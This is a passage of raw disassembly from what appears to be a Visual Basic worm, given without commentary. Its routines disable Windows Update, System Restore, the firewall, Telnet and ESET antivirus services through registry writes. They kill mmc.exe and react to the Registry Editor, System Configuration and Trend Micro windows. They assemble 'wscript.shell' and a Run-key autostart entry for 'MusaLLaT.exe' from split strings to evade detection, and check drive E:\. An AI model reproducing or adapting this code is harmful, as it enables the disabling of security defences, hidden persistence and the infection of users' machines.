  push edx
  lea eax, var_FC
  push eax
  call 0045B780h
  lea ecx, var_3C
  push ecx
  lea edx, var_38
  push edx
  lea eax, var_34
  push eax
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 0000001Eh
  mov edx, 00439BF0h
  lea ecx, var_3C
  call [00401148h]
  mov edx, 00434D50h ; "Start"
  lea ecx, var_38
  call [00401148h]
  mov edx, 00439DF4h ; "SYSTEM\CurrentControlSet\Services\TlntSvr"
  lea ecx, var_34
  call [00401148h]
  mov var_FC, 80000002h
  lea ecx, var_3C
  push ecx
  lea edx, var_38
  push edx
  lea eax, var_34
  push eax
  lea ecx, var_FC
  push ecx
  call 0045B780h
  lea edx, var_3C
  push edx
  lea eax, var_38
  push eax
  lea ecx, var_34
  push ecx
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 0000001Fh
  mov edx, 00439BF0h
  lea ecx, var_3C
  call [00401148h]
  mov edx, 00434D50h ; "Start"
  lea ecx, var_38
  call [00401148h]
  mov edx, 00439E4Ch ; "SYSTEM\ControlSet001\Services\usnjsvc"
  lea ecx, var_34
  call [00401148h]
  mov var_FC, 80000002h
  lea edx, var_3C
  push edx
  lea eax, var_38
  push eax
  lea ecx, var_34
  push ecx
  lea edx, var_FC
  push edx
  call 0045B780h
  lea eax, var_3C
  push eax
  lea ecx, var_38
  push ecx
  lea edx, var_34
  push edx
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 00000020h
  mov edx, 00439BF0h
  lea ecx, var_3C
  call [00401148h]
  mov edx, 00434D50h ; "Start"
  lea ecx, var_38
  call [00401148h]
  mov edx, 00439E9Ch ; "SYSTEM\CurrentControlSet\Services\usnjsvc"
  lea ecx, var_34
  call [00401148h]
  mov var_FC, 80000002h
  lea eax, var_3C
  push eax
  lea ecx, var_38
  push ecx
  lea edx, var_34
  push edx
  lea eax, var_FC
  push eax
  call 0045B780h
  lea ecx, var_3C
  push ecx
  lea edx, var_38
  push edx
  lea eax, var_34
  push eax
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 00000021h
  mov edx, 00434D60h
  lea ecx, var_3C
  call [00401148h]
  mov edx, 00434D50h ; "Start"
  lea ecx, var_38
  call [00401148h]
  mov edx, 00439EF4h ; "SYSTEM\ControlSet001\Services\wuauserv"
  lea ecx, var_34
  call [00401148h]
  mov var_FC, 80000002h
  lea ecx, var_3C
  push ecx
  lea edx, var_38
  push edx
  lea eax, var_34
  push eax
  lea ecx, var_FC
  push ecx
  call 0045B780h
  lea edx, var_3C
  push edx
  lea eax, var_38
  push eax
  lea ecx, var_34
  push ecx
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 00000022h
  mov edx, 00434D60h
  lea ecx, var_3C
  call [00401148h]
  mov edx, 00434D50h ; "Start"
  lea ecx, var_38
  call [00401148h]
  mov edx, 00439EF4h ; "SYSTEM\ControlSet001\Services\wuauserv"
  lea ecx, var_34
  call [00401148h]
  mov var_FC, 80000002h
  lea edx, var_3C
  push edx
  lea eax, var_38
  push eax
  lea ecx, var_34
  push ecx
  lea edx, var_FC
  push edx
  call 0045B780h
  lea eax, var_3C
  push eax
  lea ecx, var_38
  push ecx
  lea edx, var_34
  push edx
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 00000023h
  mov edx, 00434D60h
  lea ecx, var_3C
  call [00401148h]
  mov edx, 00434D50h ; "Start"
  lea ecx, var_38
  call [00401148h]
  mov edx, 00439F48h ; "SYSTEM\ControlSet001\Services\srservice"
  lea ecx, var_34
  call [00401148h]
  mov var_FC, 80000002h
  lea eax, var_3C
  push eax
  lea ecx, var_38
  push ecx
  lea edx, var_34
  push edx
  lea eax, var_FC
  push eax
  call 0045B780h
  lea ecx, var_3C
  push ecx
  lea edx, var_38
  push edx
  lea eax, var_34
  push eax
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 00000024h
  mov edx, 00434D60h
  lea ecx, var_3C
  call [00401148h]
  mov edx, 00434D50h ; "Start"
  lea ecx, var_38
  call [00401148h]
  mov edx, 00439F9Ch ; "SYSTEM\CurrentControlSet\Services\srservice"
  lea ecx, var_34
  call [00401148h]
  mov var_FC, 80000002h
  lea ecx, var_3C
  push ecx
  lea edx, var_38
  push edx
  lea eax, var_34
  push eax
  lea ecx, var_FC
  push ecx
  call 0045B780h
  lea edx, var_3C
  push edx
  lea eax, var_38
  push eax
  lea ecx, var_34
  push ecx
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 00000025h
  mov edx, 00434D60h
  lea ecx, var_3C
  call [00401148h]
  mov edx, 00434D50h ; "Start"
  lea ecx, var_38
  call [00401148h]
  mov edx, 00439FF8h ; "SYSTEM\ControlSet001\Services\SharedAccess"
  lea ecx, var_34
  call [00401148h]
  mov var_FC, 80000002h
  lea edx, var_3C
  push edx
  lea eax, var_38
  push eax
  lea ecx, var_34
  push ecx
  lea edx, var_FC
  push edx
  call 0045B780h
  lea eax, var_3C
  push eax
  lea ecx, var_38
  push ecx
  lea edx, var_34
  push edx
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 00000026h
  mov edx, 00434D60h
  lea ecx, var_3C
  call [00401148h]
  mov edx, 00434D50h ; "Start"
  lea ecx, var_38
  call [00401148h]
  mov edx, 0043A054h ; "SYSTEM\CurrentControlSet\Services\SharedAccess"
  lea ecx, var_34
  call [00401148h]
  mov var_FC, 80000002h
  lea eax, var_3C
  push eax
  lea ecx, var_38
  push ecx
  lea edx, var_34
  push edx
  lea eax, var_FC
  push eax
  call 0045B780h
  lea ecx, var_3C
  push ecx
  lea edx, var_38
  push edx
  lea eax, var_34
  push eax
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 00000027h
  mov edx, 00434D60h
  lea ecx, var_3C
  call [00401148h]
  mov edx, 00434D50h ; "Start"
  lea ecx, var_38
  call [00401148h]
  mov edx, 0043A0B8h ; "SYSTEM\ControlSet001\Services\ekrn"
  lea ecx, var_34
  call [00401148h]
  mov var_FC, 80000002h
  lea ecx, var_3C
  push ecx
  lea edx, var_38
  push edx
  lea eax, var_34
  push eax
  lea ecx, var_FC
  push ecx
  call 0045B780h
  lea edx, var_3C
  push edx
  lea eax, var_38
  push eax
  lea ecx, var_34
  push ecx
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 00000028h
  mov edx, 00434D60h
  lea ecx, var_3C
  call [00401148h]
  mov edx, 00434D50h ; "Start"
  lea ecx, var_38
  call [00401148h]
  mov edx, 0043A104h ; "SYSTEM\CurrentControlSet\Services\ekrn"
  lea ecx, var_34
  call [00401148h]
  mov var_FC, 80000002h
  lea edx, var_3C
  push edx
  lea eax, var_38
  push eax
  lea ecx, var_34
  push ecx
  lea edx, var_FC
  push edx
  call 0045B780h
  lea eax, var_3C
  push eax
  lea ecx, var_38
  push ecx
  lea edx, var_34
  push edx
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 00000029h
  mov edx, 00434D60h
  lea ecx, var_3C
  call [00401148h]
  mov edx, 00434D50h ; "Start"
  lea ecx, var_38
  call [00401148h]
  mov edx, 0043A174h ; "SYSTEM\ControlSet001\Services\EhttpSrv"
  lea ecx, var_34
  call [00401148h]
  mov var_FC, 80000002h
  lea eax, var_3C
  push eax
  lea ecx, var_38
  push ecx
  lea edx, var_34
  push edx
  lea eax, var_FC
  push eax
  call 0045B780h
  lea ecx, var_3C
  push ecx
  lea edx, var_38
  push edx
  lea eax, var_34
  push eax
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 0000002Ah
  mov edx, 00434D60h
  lea ecx, var_3C
  call [00401148h]
  mov edx, 00434D50h ; "Start"
  lea ecx, var_38
  call [00401148h]
  mov edx, 0043A1C8h ; "SYSTEM\CurrentControlSet\Services\EhttpSrv"
  lea ecx, var_34
  call [00401148h]
  mov var_FC, 80000002h
  lea ecx, var_3C
  push ecx
  lea edx, var_38
  push edx
  lea eax, var_34
  push eax
  lea ecx, var_FC
  push ecx
  call 0045B780h
  lea edx, var_3C
  push edx
  lea eax, var_38
  push eax
  lea ecx, var_34
  push ecx
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_10, 00000000h
  push 0045B759h
  jmp 0045B74Fh
  lea edx, var_88
  push edx
  lea eax, var_84
  push eax
  lea ecx, var_80
  push ecx
  lea edx, var_7C
  push edx
  lea eax, var_78
  push eax
  lea ecx, var_74
  push ecx
  lea edx, var_70
  push edx
  lea eax, var_6C
  push eax
  lea ecx, var_68
  push ecx
  lea edx, var_64
  push edx
  lea eax, var_60
  push eax
  lea ecx, var_5C
  push ecx
  lea edx, var_58
  push edx
  lea eax, var_54
  push eax
  lea ecx, var_50
  push ecx
  lea edx, var_4C
  push edx
  lea eax, var_48
  push eax
  lea ecx, var_44
  push ecx
  lea edx, var_40
  push edx
  lea eax, var_3C
  push eax
  lea ecx, var_38
  push ecx
  lea edx, var_34
  push edx
  push 00000016h
  call [00401150h]
  add esp, 0000005Ch
  lea eax, var_A8
  push eax
  lea ecx, var_98
  push ecx
  push 00000002h
  call [00401024h]
  add esp, 0000000Ch
  ret
  lea ecx, var_30
  call [00401014h]
  ret
  mov edx, Me
  mov eax, [edx]
  mov ecx, Me
  push ecx
  call [eax+00000008h]
  mov eax, var_10
  mov ecx, var_20
  mov fs:[00000000h], ecx
  pop edi
  pop esi
  pop ebx
  mov esp, ebp
  pop ebp
  retn 0004h
End Sub

Private Sub Timer12_Timer() '444F60
  push ebp
  mov ebp, esp
  sub esp, 00000018h
  push 00403896h ; ext_4010EC
  mov eax, fs:[00000000h]
  push eax
  mov fs:[00000000h], esp
  mov eax, 00000018h
  call 00403890h ; ext_40109C
  push ebx
  push esi
  push edi
  mov var_18, esp
  mov var_14, 00401660h ; Chr(37)
  mov eax, Me
  and eax, 00000001h
  mov var_10, eax
  mov ecx, Me
  and ecx, FFFFFFFEh
  mov Me, ecx
  mov var_C, 00000000h
  mov edx, Me
  mov eax, [edx]
  mov ecx, Me
  push ecx
  call [eax+00000004h]
  mov var_4, 00000001h
  mov var_4, 00000002h
  push FFFFFFFFh
  call [00401070h]
  mov var_4, 00000003h
  mov edx, 00419864h ; "mmc.exe"
  lea ecx, var_24
  call [00401148h]
  lea edx, var_24
  push edx
  mov eax, Me
  mov ecx, [eax]
  mov edx, Me
  push edx
  call [ecx+00000704h]
  lea ecx, var_24
  call [004011CCh]
  mov var_10, 00000000h
  push 00445015h
  jmp 00445014h
  lea ecx, var_24
  call [004011CCh]
  ret
  ret
  mov eax, Me
  mov ecx, [eax]
  mov edx, Me
  push edx
  call [ecx+00000008h]
  mov eax, var_10
  mov ecx, var_20
  mov fs:[00000000h], ecx
  pop edi
  pop esi
  pop ebx
  mov esp, ebp
  pop ebp
  retn 0004h
End Sub

Private Sub Timer3_Timer() '448640
  push ebp
  mov ebp, esp
  sub esp, 00000018h
  push 00403896h ; ext_4010EC
  mov eax, fs:[00000000h]
  push eax
  mov fs:[00000000h], esp
  mov eax, 00000168h
  call 00403890h ; ext_40109C
  push ebx
  push esi
  push edi
  mov var_18, esp
  mov var_14, 00401978h ; "'"
  mov eax, Me
  and eax, 00000001h
  mov var_10, eax
  mov ecx, Me
  and ecx, FFFFFFFEh
  mov Me, ecx
  mov var_C, 00000000h
  mov edx, Me
  mov eax, [edx]
  mov ecx, Me
  push ecx
  call [eax+00000004h]
  mov var_4, 00000001h
  mov var_4, 00000002h
  push FFFFFFFFh
  call [00401070h]
  mov var_4, 00000003h
  mov edx, Me
  mov eax, [edx]
  mov ecx, Me
  push ecx
  call [eax+00000340h]
  push eax
  lea edx, var_88
  push edx
  call [00401078h]
  mov var_110, eax
  lea eax, var_34
  push eax
  mov ecx, var_110
  mov edx, [ecx]
  mov eax, var_110
  push eax
  call [edx+000000A0h]
  fnclex
  mov var_114, eax
  cmp var_114, 00000000h
  jge 00448725h
  push 000000A0h
  push 00418EA4h
  mov ecx, var_110
  push ecx
  mov edx, var_114
  push edx
  call [00401058h]
  mov var_154, eax
  jmp 0044872Fh
  mov var_154, 00000000h
  mov eax, Me
  mov ecx, [eax]
  mov edx, Me
  push edx
  call [ecx+00000340h]
  push eax
  lea eax, var_7C
  push eax
  call [00401078h]
  mov var_118, eax
  lea ecx, var_28
  push ecx
  mov edx, var_118
  mov eax, [edx]
  mov ecx, var_118
  push ecx
  call [eax+000000A0h]
  fnclex
  mov var_11C, eax
  cmp var_11C, 00000000h
  jge 0044879Fh
  push 000000A0h
  push 00418EA4h
  mov edx, var_118
  push edx
  mov eax, var_11C
  push eax
  call [00401058h]
  mov var_158, eax
  jmp 004487A9h
  mov var_158, 00000000h
  mov ecx, Me
  mov edx, [ecx]
  mov eax, Me
  push eax
  call [edx+00000340h]
  push eax
  lea ecx, var_80
  push ecx
  call [00401078h]
  mov var_120, eax
  lea edx, var_2C
  push edx
  mov eax, var_120
  mov ecx, [eax]
  mov edx, var_120
  push edx
  call [ecx+000000A0h]
  fnclex
  mov var_124, eax
  cmp var_124, 00000000h
  jge 00448819h
  push 000000A0h
  push 00418EA4h
  mov eax, var_120
  push eax
  mov ecx, var_124
  push ecx
  call [00401058h]
  mov var_15C, eax
  jmp 00448823h
  mov var_15C, 00000000h
  mov edx, Me
  mov eax, [edx]
  mov ecx, Me
  push ecx
  call [eax+00000340h]
  push eax
  lea edx, var_84
  push edx
  call [00401078h]
  mov var_128, eax
  lea eax, var_30
  push eax
  mov ecx, var_128
  mov edx, [ecx]
  mov eax, var_128
  push eax
  call [edx+000000A0h]
  fnclex
  mov var_12C, eax
  cmp var_12C, 00000000h
  jge 00448896h
  push 000000A0h
  push 00418EA4h
  mov ecx, var_128
  push ecx
  mov edx, var_12C
  push edx
  call [00401058h]
  mov var_160, eax
  jmp 004488A0h
  mov var_160, 00000000h
  mov eax, var_28
  push eax
  push 0041BECCh ; "Çalýþtýr"
  call [004010B0h]
  mov esi, eax
  neg esi
  sbb esi, esi
  inc esi
  neg esi
  mov ecx, var_2C
  push ecx
  push 0041BEE4h ; "Sistem Yapýlandýrma Yardýmcý Programý"
  call [004010B0h]
  neg eax
  sbb eax, eax
  inc eax
  neg eax
  or si, ax
  mov edx, var_30
  push edx
  push 0041BF34h ; "Kayýt Defteri Düzenleyicisi"
  call [004010B0h]
  neg eax
  sbb eax, eax
  inc eax
  neg eax
  or si, ax
  mov var_F4, si
  mov var_FC, 0000000Bh
  mov eax, var_34
  mov var_150, eax
  mov var_34, 00000000h
  mov ecx, var_150
  mov var_94, ecx
  mov var_9C, 00000008h
  push 0000000Bh
  lea edx, var_9C
  push edx
  lea eax, var_AC
  push eax
  call [004011A4h]
  mov var_E4, 0041BF70h ; "Trend Micro"
  mov var_EC, 00008008h
  mov ecx, Me
  mov edx, [ecx]
  mov eax, Me
  push eax
  call [edx+00000340h]
  push eax
  lea ecx, var_8C
  push ecx
  call [00401078h]
  mov var_130, eax
  lea edx, var_38
  push edx
  mov eax, var_130
  mov ecx, [eax]
  mov edx, var_130
  push edx
  call [ecx+000000A0h]
  fnclex
  mov var_134, eax
  cmp var_134, 00000000h
  jge 004489BEh
  push 000000A0h
  push 00418EA4h
  mov eax, var_130
  push eax
  mov ecx, var_134
  push ecx
  call [00401058h]
  mov var_164, eax
  jmp 004489C8h
  mov var_164, 00000000h
  mov edx, var_38
  push edx
  push 0041BF8Ch ; "Sistem Yapýlandýrmasý"
  call [004010B0h]
  neg eax
  sbb eax, eax
  inc eax
  neg eax
  mov var_104, ax
  mov var_10C, 0000000Bh
  lea eax, var_FC
  push eax
  lea ecx, var_AC
  push ecx
  lea edx, var_EC
  push edx
  lea eax, var_BC
  push eax
  call [00401174h]
  push eax
  lea ecx, var_CC
  push ecx
  call [004010C8h]
  push eax
  lea edx, var_10C
  push edx
  lea eax, var_DC
  push eax
  call [004010C8h]
  push eax
  call [00401090h]
  mov var_138, ax
  lea ecx, var_38
  push ecx
  lea edx, var_30
  push edx
  lea eax, var_2C
  push eax
  lea ecx, var_28
  push ecx
  push 00000004h
  call [00401150h]
  add esp, 00000014h
  lea edx, var_8C
  push edx
  lea eax, var_88
  push eax
  lea ecx, var_84
  push ecx
  lea edx, var_80
  push edx
  lea eax, var_7C
  push eax
  push 00000005h
  call [0040102Ch]
  add esp, 00000018h
  lea ecx, var_10C
  push ecx
  lea edx, var_FC
  push edx
  lea eax, var_AC
  push eax
  lea ecx, var_9C
  push ecx
  push 00000004h
  call [00401024h]
  add esp, 00000014h
  movsx edx, var_138
  test edx, edx
  jz 00448B42h
  mov var_4, 00000004h
  mov eax, Me
  mov ecx, [eax]
  mov edx, Me
  push edx
  call [ecx+00000344h]
  push eax
  lea eax, var_7C
  push eax
  call [00401078h]
  mov var_110, eax
  push FFFFFFFFh
  mov ecx, var_110
  mov edx, [ecx]
  mov eax, var_110
  push eax
  call [edx+0000005Ch]
  fnclex
  mov var_114, eax
  cmp var_114, 00000000h
  jge 00448B2Ah
  push 0000005Ch
  push 0041925Ch
  mov ecx, var_110
  push ecx
  mov edx, var_114
  push edx
  call [00401058h]
  mov var_168, eax
  jmp 00448B34h
  mov var_168, 00000000h
  lea ecx, var_7C
  call [004011D4h]
  jmp 0044914Dh
  mov var_4, 00000006h
  mov eax, Me
  mov ecx, [eax]
  mov edx, Me
  push edx
  call [ecx+00000344h]
  push eax
  lea eax, var_7C
  push eax
  call [00401078h]
  mov var_110, eax
  push 00000000h
  mov ecx, var_110
  mov edx, [ecx]
  mov eax, var_110
  push eax
  call [edx+0000005Ch]
  fnclex
  mov var_114, eax
  cmp var_114, 00000000h
  jge 00448BB1h
  push 0000005Ch
  push 0041925Ch
  mov ecx, var_110
  push ecx
  mov edx, var_114
  push edx
  call [00401058h]
  mov var_16C, eax
  jmp 00448BBBh
  mov var_16C, 00000000h
  lea ecx, var_7C
  call [004011D4h]
  mov var_4, 00000007h
  push 00000000h
  push 0041BFBCh ; "wsc"
  push 0041BFC8h ; "ri"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 0041BFD4h ; "pt.s"
  call [00401044h]
  mov edx, eax
  lea ecx, var_2C
  call [004011ACh]
  push eax
  push 0041BFE4h ; "he"
  call [00401044h]
  mov edx, eax
  lea ecx, var_30
  call [004011ACh]
  push eax
  push 0041BFF0h ; "ll"
  call [00401044h]
  mov edx, eax
  lea ecx, var_34
  call [004011ACh]
  push eax
  lea eax, var_9C
  push eax
  call [00401108h]
  lea ecx, var_9C
  push ecx
  call [004010C0h]
  push eax
  lea edx, var_24
  push edx
  call [00401080h]
  lea eax, var_34
  push eax
  lea ecx, var_30
  push ecx
  lea edx, var_2C
  push edx
  lea eax, var_28
  push eax
  push 00000004h
  call [00401150h]
  add esp, 00000014h
  lea ecx, var_9C
  call [00401014h]
  mov var_4, 00000008h
  cmp [00460558h], 00000000h
  jnz 00448CA6h
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov var_170, 00460558h
  jmp 00448CB0h
  mov var_170, 00460558h
  mov ecx, var_170
  mov edx, [ecx]
  mov var_110, edx
  lea eax, var_7C
  push eax
  mov ecx, var_110
  mov edx, [ecx]
  mov eax, var_110
  push eax
  call [edx+00000014h]
  fnclex
  mov var_114, eax
  cmp var_114, 00000000h
  jge 00448D08h
  push 00000014h
  push 00418ED0h
  mov ecx, var_110
  push ecx
  mov edx, var_114
  push edx
  call [00401058h]
  mov var_174, eax
  jmp 00448D12h
  mov var_174, 00000000h
  mov eax, var_7C
  mov var_118, eax
  lea ecx, var_68
  push ecx
  mov edx, var_118
  mov eax, [edx]
  mov ecx, var_118
  push ecx
  call [eax+00000058h]
  fnclex
  mov var_11C, eax
  cmp var_11C, 00000000h
  jge 00448D65h
  push 00000058h
  push 00418EF0h
  mov edx, var_118
  push edx
  mov eax, var_11C
  push eax
  call [00401058h]
  mov var_178, eax
  jmp 00448D6Fh
  mov var_178, 00000000h
  push 0041AAC0h ; "HKE"
  push 0041BFFCh ; "Y_CU"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 0041C00Ch ; "RREN"
  call [00401044h]
  mov edx, eax
  lea ecx, var_2C
  call [004011ACh]
  push eax
  push 0041C01Ch ; "T_US"
  call [00401044h]
  mov edx, eax
  lea ecx, var_30
  call [004011ACh]
  push eax
  push 0041C02Ch ; "ER\SO"
  call [00401044h]
  mov edx, eax
  lea ecx, var_34
  call [004011ACh]
  push eax
  push 0041C03Ch ; "FTW"
  call [00401044h]
  mov edx, eax
  lea ecx, var_38
  call [004011ACh]
  push eax
  push 0041C048h ; "ARE"
  call [00401044h]
  mov edx, eax
  lea ecx, var_3C
  call [004011ACh]
  push eax
  push 0041C054h ; "\Mi"
  call [00401044h]
  mov edx, eax
  lea ecx, var_40
  call [004011ACh]
  push eax
  push 0041B9E8h ; "cro"
  call [00401044h]
  mov edx, eax
  lea ecx, var_44
  call [004011ACh]
  push eax
  push 0041C060h ; "soft"
  call [00401044h]
  mov edx, eax
  lea ecx, var_48
  call [004011ACh]
  push eax
  push 0041C070h ; "\Wi"
  call [00401044h]
  mov edx, eax
  lea ecx, var_4C
  call [004011ACh]
  push eax
  push 0041C07Ch ; "ndo"
  call [00401044h]
  mov edx, eax
  lea ecx, var_50
  call [004011ACh]
  push eax
  push 0041C088h ; "ws\Cu"
  call [00401044h]
  mov edx, eax
  lea ecx, var_54
  call [004011ACh]
  push eax
  push 0041C098h ; "rren"
  call [00401044h]
  mov edx, eax
  lea ecx, var_58
  call [004011ACh]
  push eax
  push 0041C0A8h ; "tVer"
  call [00401044h]
  mov edx, eax
  lea ecx, var_5C
  call [004011ACh]
  push eax
  push 0041C0B8h ; "sion\R"
  call [00401044h]
  mov edx, eax
  lea ecx, var_60
  call [004011ACh]
  push eax
  push 0041C0CCh ; "un"
  call [00401044h]
  mov edx, eax
  lea ecx, var_64
  call [004011ACh]
  push eax
  push 00418DA4h ; "\"
  call [00401044h]
  mov edx, eax
  lea ecx, var_6C
  call [004011ACh]
  push eax
  mov ecx, var_68
  push ecx
  call [00401044h]
  mov var_94, eax
  mov var_9C, 00000008h
  cmp [00460558h], 00000000h
  jnz 00448F3Ah
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov var_17C, 00460558h
  jmp 00448F44h
  mov var_17C, 00460558h
  mov edx, var_17C
  mov eax, [edx]
  mov var_120, eax
  lea ecx, var_80
  push ecx
  mov edx, var_120
  mov eax, [edx]
  mov ecx, var_120
  push ecx
  call [eax+00000014h]
  fnclex
  mov var_124, eax
  cmp var_124, 00000000h
  jge 00448F9Ch
  push 00000014h
  push 00418ED0h
  mov edx, var_120
  push edx
  mov eax, var_124
  push eax
  call [00401058h]
  mov var_180, eax
  jmp 00448FA6h
  mov var_180, 00000000h
  mov ecx, var_80
  mov var_128, ecx
  lea edx, var_70
  push edx
  mov eax, var_128
  mov ecx, [eax]
  mov edx, var_128
  push edx
  call [ecx+00000050h]
  fnclex
  mov var_12C, eax
  cmp var_12C, 00000000h
  jge 00448FF9h
  push 00000050h
  push 00418EF0h
  mov eax, var_128
  push eax
  mov ecx, var_12C
  push ecx
  call [00401058h]
  mov var_184, eax
  jmp 00449003h
  mov var_184, 00000000h
  mov edx, var_70
  push edx
  push 0041C0D8h ; "\Mu"
  call [00401044h]
  mov edx, eax
  lea ecx, var_74
  call [004011ACh]
  push eax
  push 0041C0E4h ; "sa"
  call [00401044h]
  mov edx, eax
  lea ecx, var_78
  call [004011ACh]
  push eax
  push 0041C0F0h ; "LLaT.exe"
  call [00401044h]
  mov var_A4, eax
  mov var_AC, 00000008h
  mov eax, 00000010h
  call 00403890h ; ext_40109C
  mov eax, esp
  mov ecx, var_9C
  mov [eax], ecx
  mov edx, var_98
  mov [eax+00000004h], edx
  mov ecx, var_94
  mov [eax+00000008h], ecx
  mov edx, var_90
  mov [eax+0000000Ch], edx
  mov eax, 00000010h
  call 00403890h ; ext_40109C
  mov eax, esp
  mov ecx, var_AC
  mov [eax], ecx
  mov edx, var_A8
  mov [eax+00000004h], edx
  mov ecx, var_A4
  mov [eax+00000008h], ecx
  mov edx, var_A0
  mov [eax+0000000Ch], edx
  push 00000002h
  push 0041C104h ; "RegWrite"
  mov eax, var_24
  push eax
  call [00401184h]
  add esp, 0000002Ch
  lea ecx, var_78
  push ecx
  lea edx, var_74
  push edx
  lea eax, var_70
  push eax
  lea ecx, var_68
  push ecx
  lea edx, var_6C
  push edx
  lea eax, var_64
  push eax
  lea ecx, var_60
  push ecx
  lea edx, var_5C
  push edx
  lea eax, var_58
  push eax
  lea ecx, var_54
  push ecx
  lea edx, var_50
  push edx
  lea eax, var_4C
  push eax
  lea ecx, var_48
  push ecx
  lea edx, var_44
  push edx
  lea eax, var_40
  push eax
  lea ecx, var_3C
  push ecx
  lea edx, var_38
  push edx
  lea eax, var_34
  push eax
  lea ecx, var_30
  push ecx
  lea edx, var_2C
  push edx
  lea eax, var_28
  push eax
  push 00000015h
  call [00401150h]
  add esp, 00000058h
  lea ecx, var_80
  push ecx
  lea edx, var_7C
  push edx
  push 00000002h
  call [0040102Ch]
  add esp, 0000000Ch
  lea eax, var_AC
  push eax
  lea ecx, var_9C
  push ecx
  push 00000002h
  call [00401024h]
  add esp, 0000000Ch
  mov var_4, 0000000Ah
  lea edx, var_9C
  push edx
  mov eax, Me
  mov ecx, [eax]
  mov edx, Me
  push edx
  call [ecx+000006FCh]
  mov var_110, eax
  cmp var_110, 00000000h
  jge 0044919Ch
  push 000006FCh
  push 00418934h
  mov eax, Me
  push eax
  mov ecx, var_110
  push ecx
  call [00401058h]
  mov var_188, eax
  jmp 004491A6h
  mov var_188, 00000000h
  lea ecx, var_9C
  call [00401014h]
  mov var_10, 00000000h
  push 00449283h
  jmp 00449279h
  lea edx, var_78
  push edx
  lea eax, var_74
  push eax
  lea ecx, var_70
  push ecx
  lea edx, var_6C
  push edx
  lea eax, var_68
  push eax
  lea ecx, var_64
  push ecx
  lea edx, var_60
  push edx
  lea eax, var_5C
  push eax
  lea ecx, var_58
  push ecx
  lea edx, var_54
  push edx
  lea eax, var_50
  push eax
  lea ecx, var_4C
  push ecx
  lea edx, var_48
  push edx
  lea eax, var_44
  push eax
  lea ecx, var_40
  push ecx
  lea edx, var_3C
  push edx
  lea eax, var_38
  push eax
  lea ecx, var_34
  push ecx
  lea edx, var_30
  push edx
  lea eax, var_2C
  push eax
  lea ecx, var_28
  push ecx
  push 00000015h
  call [00401150h]
  add esp, 00000058h
  lea edx, var_8C
  push edx
  lea eax, var_88
  push eax
  lea ecx, var_84
  push ecx
  lea edx, var_80
  push edx
  lea eax, var_7C
  push eax
  push 00000005h
  call [0040102Ch]
  add esp, 00000018h
  lea ecx, var_DC
  push ecx
  lea edx, var_CC
  push edx
  lea eax, var_BC
  push eax
  lea ecx, var_AC
  push ecx
  lea edx, var_9C
  push edx
  push 00000005h
  call [00401024h]
  add esp, 00000018h
  ret
  lea ecx, var_24
  call [004011D4h]
  ret
  mov eax, Me
  mov ecx, [eax]
  mov edx, Me
  push edx
  call [ecx+00000008h]
  mov eax, var_10
  mov ecx, var_20
  mov fs:[00000000h], ecx
  pop edi
  pop esi
  pop ebx
  mov esp, ebp
  pop ebp
  retn 0004h
End Sub

Private Sub Timer1_Timer() '43DDA0
  push ebp
  mov ebp, esp
  sub esp, 00000018h
  push 00403896h ; ext_4010EC
  mov eax, fs:[00000000h]
  push eax
  mov fs:[00000000h], esp
  mov eax, 000002B4h
  call 00403890h ; ext_40109C
  push ebx
  push esi
  push edi
  mov var_18, esp
  mov var_14, 00401368h ; "'"
  mov eax, Me
  and eax, 00000001h
  mov var_10, eax
  mov ecx, Me
  and ecx, FFFFFFFEh
  mov Me, ecx
  mov var_C, 00000000h
  mov edx, Me
  mov eax, [edx]
  mov ecx, Me
  push ecx
  call [eax+00000004h]
  mov var_4, 00000001h
  mov var_4, 00000002h
  push FFFFFFFFh
  call [00401070h]
  mov var_4, 00000003h
  mov var_F8, 00419310h ; "E:\"
  mov var_100, 00000008h
  lea edx, var_100
  lea ecx, var_D0
  call [0040118Ch]
  push 00000000h
  lea edx, var_D0
  push edx
  call [00401120h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 00418DE4h
  call [004010B0h]
  neg eax
  sbb eax, eax
  neg eax
  neg eax
  mov var_118, ax
  mov var_120, 0000000Bh
  mov var_108, 00000000h
  mov var_110, 0000800Bh
  lea eax, var_120
  push eax
  lea ecx, var_70
  push ecx
  lea edx, var_110
  push edx
  lea eax, var_E0
  push eax
  call [00401174h]
  push eax
  lea ecx, var_F0
  push ecx
  call [004010E4h]
  push eax
  call [00401090h]
  mov var_124, ax
  lea ecx, var_A4
  call [004011CCh]
  lea edx, var_120
  push edx
  lea eax, var_D0
  push eax
  push 00000002h
  call [00401024h]
  add esp, 0000000Ch
  movsx ecx, var_124
  test ecx, ecx
  jz 0043E913h
  mov var_4, 00000004h
  cmp [00460558h], 00000000h
  jnz 0043DF29h
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov var_158, 00460558h
  jmp 0043DF33h
  mov var_158, 00460558h
  mov edx, var_158
  mov eax, [edx]
  mov var_124, eax
  lea ecx, var_BC
  push ecx
  mov edx, var_124
  mov eax, [edx]
  mov ecx, var_124
  push ecx
  call [eax+00000014h]
  fnclex
  mov var_128, eax
  cmp var_128, 00000000h
  jge 0043DF8Eh
  push 00000014h
  push 00418ED0h
  mov edx, var_124
  push edx
  mov eax, var_128
  push eax
  call [00401058h]
  mov var_15C, eax
  jmp 0043DF98h
  mov var_15C, 00000000h
  mov ecx, var_BC
  mov var_12C, ecx
  lea edx, var_A4
  push edx
